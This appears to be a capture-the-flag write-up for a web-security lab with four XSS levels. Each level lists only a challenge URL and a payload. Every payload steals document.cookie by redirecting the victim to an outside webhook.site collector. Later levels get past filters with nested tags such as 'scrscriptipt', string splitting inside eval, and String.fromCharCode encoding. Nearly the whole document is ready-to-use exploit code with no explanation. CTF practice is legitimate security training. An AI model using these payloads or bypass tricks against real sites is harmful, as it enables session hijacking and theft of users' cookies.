# XSS ME 1 

> ``` https://nopsctf-xss-lab.chals.io/ ```

```html
<script>location.href="https://webhook.site/92f96061-55b6-421d-a882-068b0d8c7677/"+document.cookie</script>
```
# XSS ME 2

> ``` https://nopsctf-xss-lab.chals.io/bf2a73106a3aa48bab9b8b47e4bd350e ```

```html
<iframe src="/" onload=location.href="https://webhook.site/92f96061-55b6-421d-a882-068b0d8c7677/"+document.cookie>
```

# XSS ME 3

> ``` https://nopsctf-xss-lab.chals.io/3e79c8a64bd10f5fa897b7832384f043 ```

```html
<scrscriptipt>location.href="https:"+"//webhook.site/92f96061-55b6-421d-a882-068b0d8c7677/"+eval("docu" + "ment.coo" + "kie")</scrscriptipt>
```

# XSS ME 4

> ``` https://nopsctf-xss-lab.chals.io/f40e749b80cff27f8e726b2a95740dd6 ```

```html
<iimgmg src=x onerror=location.href=eval(String.fromCharCode(34,104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,115,105,116,101,47,57,50,102,57,54,48,54,49,45,53,53,98,54,45,52,50,49,100,45,97,56,56,50,45,48,54,56,98,48,100,56,99,55,54,55,55,47,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101))>
```